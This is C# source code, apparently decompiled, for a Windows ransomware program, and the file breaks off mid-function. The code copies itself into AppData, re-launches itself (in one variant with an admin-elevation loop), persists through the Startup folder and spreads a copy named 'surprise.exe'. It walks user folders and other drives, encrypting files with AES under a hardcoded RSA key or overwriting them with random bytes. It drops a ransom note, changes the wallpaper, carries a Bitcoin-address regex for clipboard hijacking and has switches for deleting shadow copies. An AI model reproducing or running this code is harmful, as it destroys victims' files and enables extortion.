using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "WINDAH.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "WINDAH";

	private static bool checkAdminPrivilage = false;

	private static bool checkdeleteShadowCopies = false;

	private static bool checkdisableRecoveryMode = false;

	private static bool checkdeleteBackupCatalog = false;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[3] { "OH MAN WHY YOU DOWNLOAD THIS YOU DONT NEED TO PAY", "", "" };

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>ojmVpNA0cPbiPKVPjNHZSOxpeMNQms/uf3XZg7FFLLcyPB1q2WRYyeFcLzOyok35Rfi/pA1kzMKNY88FMj4K66uCK/I4YmPKQg/MnCLEqn/Nruc5UlIFQ9fBX0SeZ5MEWBk9lFniT/Pz54PixmxMgHPEy8tJ4scQg7fHUryJV5k=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
